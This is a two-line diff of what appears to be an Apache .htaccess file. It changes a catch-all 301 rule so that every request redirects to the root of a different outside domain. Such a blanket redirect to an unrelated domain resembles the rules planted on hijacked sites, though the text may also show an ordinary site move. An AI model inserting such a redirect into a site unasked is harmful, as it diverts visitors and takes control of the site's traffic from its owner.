@@ -1,2 +1,2 @@
 RewriteEngine On
-RewriteRule ^(.*)$ https://louisvilleitele.edu.ng/ [R=301,L]
+RewriteRule ^(.*)$ https://www.vnavarro.org/ [R=301,L]
